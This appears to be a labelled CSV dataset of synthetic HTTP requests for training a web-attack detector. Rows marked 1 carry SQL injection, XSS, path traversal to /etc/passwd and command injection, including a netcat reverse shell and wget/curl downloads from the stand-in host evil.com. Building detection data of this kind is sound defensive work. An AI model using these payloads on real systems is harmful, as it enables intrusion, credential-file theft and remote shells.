text,label
POST /api/v2/analytics age=389&order_id=710&quantity=file%3A///etc/passwd&filters=274&tracking=424 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/products type=919&email=106 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /api/v2/analytics?new_password=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/reports?search_term=123%20file%3A///etc/passwd%20comment&region=contact+me+at+email@example.com&tags=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /products/123 username=378&name=318&order_id=456&view=601&product_id=662 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /products/123 tags=John+Doe&username=%60id%60&session=612 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /register?action=907&page=585&filter=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&city=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /login?filter=997&filters=974&color=thank%20%3Csvg%20onload%3Dalert%281%29%3E%20entry&content=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /js/app.js tracking=795&old_password=contact+me+at+email@example.com&filter=694 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/products?q=admin+access+request&tags=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /js/app.js?id=862&filters=test+user&product_id=635&color=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /docs/api?age=system+log+entry&title=560 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /images/logo.png?password=my+address+is&lang=629&order_id=%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd&price_min=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /docs/api?token=my%20admin%27/%2A%20you&date=724&tags=169&view=471 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /settings?search=my%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/search action=299&city=945&rating=324&content=688&category=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /dashboard?last_name=%27%20AND%20%27x%27%3D%27x&color=hello+world&id=685&first_name=191 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/v1/data city=I+would+like+to+order&price_max=this+is+a+normal+comment&filters=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /products/123?color=%7C%20curl%20http%3A//evil.com/backdoor&token=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /settings?view=contact+me+at+email@example.com&columns=22&password=please%20%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%20comment&order=646 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /users/456?content=John+Doe&filter=174&id=820 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /login?order=thank+you&new_password=123+Main+St&search_term=833&token=best%20%27%3B%20DROP%20TABLE%20users--%20comment&region=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /docs/api?region=763&token=contact+me+at+email@example.com&age=thank%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /contact?quantity=thank%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20email%40example.com&price_max=I+would+like+to+order&q=782 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /api/reports?type=../../../etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /images/logo.png product_id=592&type=I+would+like+to+order&username=481&tracking=325 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /settings?session=test%20%27%20OR%201%3D1--%20comment&phone=123+Main+St User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /posts/789?id=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /dashboard rating=contact+me+at+email@example.com&search=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&first_name=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /help/faq last_name=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&content=906&product_id=582&comment=172&name=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/search?comment=test+user&rating=this+is+a+normal+comment&old_password=admin+access+request&columns=please+find+attached User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /js/app.js sort=920&region=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/orders?category=thank+you&page=system+log+entry&tags=797&old_password=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /contact?id=John+Doe&filter=807&order_id=admin+access+request&quantity=hello%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20comment&type=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /contact?content=433&sort=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/orders status=119&tags=665&id=557&comment=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /css/style.css q=123+Main+St&action=346&rating=898&color=514 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /css/style.css q=123+Main+St&username=188&city=403&age=test+user&limit=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /api/v2/analytics?limit=%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /docs/api?limit=thank%20%27%20AND%201%3D1--%20request&last_name=154&order_id=thank+you&lang=652&user_id=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /profile old_password=this+is+a+normal+comment&filter=John%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20attached&first_name=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?last_name=I+would+like+to+order&password=contact+me+at+email@example.com&price_max=262&filter=57 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /register type=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /dashboard tag=29&filters=104&title=7&q=500 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /docs/api?search=310&phone=hello+world&old_password=test+user&email=285&format=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /register?format=407&old_password=../../../etc/passwd&author=John+Doe&content=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /docs/api?action=380 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /settings?author=test%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /register title=357&order=my%20/var/www/../../etc/passwd%20St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /profile user_id=807&action=838&region=629&new_password=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /api/products region=633&search_term=117&product_id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&tag=this+is+a+normal+comment&user_id=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /help/faq?lang=my+address+is&email=system+log+entry&phone=11&view=624&color=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/reports id=this+is+a+normal+comment&lang=123%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20world&action=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /images/logo.png product_id=%26%20whoami User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /docs/api?password=I+would+like+to+order&tags=please+find+attached&search_term=408&lang=255&q=199 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /profile search=46&page=I+would+like+to+order&quantity=admin+access+request&session=%26%20nc%20-e%20/bin/bash%20evil.com%204444 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /docs/api password=admin%27%20OR%20%271%27%3D%271&lang=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /docs/api view=809&password=John%20..%25252f..%25252f..%25252fetc%25252fpasswd%20entry&sort=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard limit=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /about search_term=518&tag=793&token=my%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /dashboard?color=123+Main+St&category=test%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20regards&id=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?limit=622&type=my+address+is&lang=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&token=my+address+is&region=779 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /register price_min=214&region=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /api/products?last_name=this+is+a+normal+comment&columns=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /api/search content=57&city=467&user_id=172 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /settings category=test%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20attached&username=903 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /api/users session=306&first_name=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E&color=system+log+entry&product_id=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard columns=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/search?last_name=545&product_id=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /settings user_id=845&new_password=system%20%27%20AND%201%3D1--%20comment&columns=846&product_id=thank+you&view=399 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/orders?limit=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /docs/api?order=please+find+attached&date=237&filters=434&filter=my+address+is&limit=/var/www/../../etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /dashboard columns=this%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20attached&limit=324 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/reports?action=hello+world&category=742&page=720&price_min=721&filters=788 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/v2/analytics?comment=please%20../../../etc/passwd%20regards&filters=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /css/style.css filters=870&price_max=admin+access+request&name=861&phone=admin%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /dashboard?tags=833&category=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /register email=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /contact?first_name=123+Main+St&content=278&region=hello+world&name=thank+you&view=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /about?search=%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--&price_max=I+would+like+to+order&session=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /contact limit=admin+access+request&author=test+user&order=John+Doe&first_name=320&tracking=31 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /login?filter=hello+world&action=116 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /help/faq?color=hello+world&first_name=123+Main+St&view=my+address+is&city=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/v2/analytics?filters=664&password=817&title=thank+you&user_id=321 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /products/123?last_name=thank%20%3Bcat%24%7BIFS%7D/etc/passwd%20is&age=554 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/search?sort=502&region=123+Main+St&city=test%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /docs/api?filters=135&title=John%20%7C%20cat%20/etc/passwd%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/v1/data last_name=360&color=test+user&new_password=696&phone=best%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20world&content=784 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/products token=123+Main+St&color=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&new_password=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /js/app.js product_id=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /register?page=123%20%27%20AND%201%3D1--%20comment&date=admin+access+request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /about?search=system%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20email%40example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/search q=contact+me+at+email@example.com&name=777 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/orders?sort=contact+me+at+email@example.com&price_min=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&city=791&username=I+would+like+to+order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/users comment=124&author=474&city=%3B%20ls%20-la&session=hello+world&id=431 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/reports?format=527 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/products price_min=446&filters=thank+you&new_password=system+log+entry&order_id=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /api/search?action=362&type=50&age=793&quantity=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /about?username=../../../etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /docs/api?type=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&token=889 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /docs/api?title=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&tags=123+Main+St&id=631&author=please+find+attached&tag=2 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /contact?limit=please%20admin%27--%20order&username=260&new_password=I+would+like+to+order&lang=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /posts/789 action=102&email=this+is+a+normal+comment&format=79 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /docs/api?author=252&category=please%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20St&id=178 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /docs/api?format=my+address+is&order=29&phone=John+Doe&region=thank+you&limit=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /api/users?old_password=232&quantity=hello+world&page=4 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /users/456?city=I+would+like+to+order&phone=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/reports new_password=778&view=system+log+entry&price_min=345&old_password=942&id=469 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /posts/789?id=224&date=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /about?search_term=%7C%20cat%20/etc/passwd&username=best+regards&order=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /posts/789?lang=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&tag=783&filter=633 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /settings tags=488&price_max=please+find+attached&city=this%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20user&order_id=admin+access+request&product_id=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/orders type=best%20%60echo%20Y2F0IC9ldGMvcGFzc3dk%20%7C%20base64%20-d%20%7C%20sh%60%20regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?order_id=John+Doe&tags=my+address+is&price_min=my+address+is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /help/faq quantity=774 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/products user_id=667&search=198&last_name=938&tags=671&order=994 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
POST /api/v2/analytics price_max=best+regards&tag=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /api/users search_term=%3B%20ls%20-la User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /css/style.css content=16&tags=this+is+a+normal+comment&age=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /docs/api?session=832&comment=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/reports view=748&city=847&limit=876&new_password=hello+world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /api/v1/data?product_id=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /help/faq title=123+Main+St&username=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css tags=I+would+like+to+order&page=982&old_password=431&content=123+Main+St&city=544 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /about?region=202&rating=50&filter=559&title=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /about?email=system%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20regards&action=796 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /dashboard?date=621&first_name=743&format=John+Doe&product_id=my%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20St&tracking=535 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /css/style.css?view=admin+access+request&columns=system+log+entry&old_password=403&product_id=I%201%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29--%20request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/products?type=490&format=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&quantity=565&action=364 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/users?order=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /api/search?old_password=thank+you&format=498&page=test+user&user_id=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /posts/789?quantity=%3Csvg%20onload%3Dalert%281%29%3E&q=171 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /docs/api?first_name=please+find+attached&format=test+user&tag=188&date=200&user_id=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v2/analytics city=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/users?columns=this%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /settings id=thank+you&product_id=John+Doe&sort=26&price_min=thank+you&page=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /api/orders?page=please+find+attached&username=test+user&rating=123+Main+St&password=990&price_min=838 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/orders?columns=123%20%7Cc%27a%27t%20/etc/passwd%20world&age=949&comment=best+regards User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /profile?category=this+is+a+normal+comment&page=913&phone=%3B%20wget%20http%3A//evil.com/shell.sh&user_id=123+Main+St&last_name=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /products/123 session=John+Doe&rating=my%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20user&price_max=843&new_password=239 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /register search_term=I%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20world&q=260&name=813 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /css/style.css?tag=399&tags=please%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20request&title=432&product_id=805 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/users first_name=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /login?order_id=admin%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20regards User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /js/app.js price_min=296&filters=873&password=%27%20AND%20%27x%27%3D%27y User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /profile type=542&page=admin+access+request&quantity=this+is+a+normal+comment&content=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /profile rating=924&content=969 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
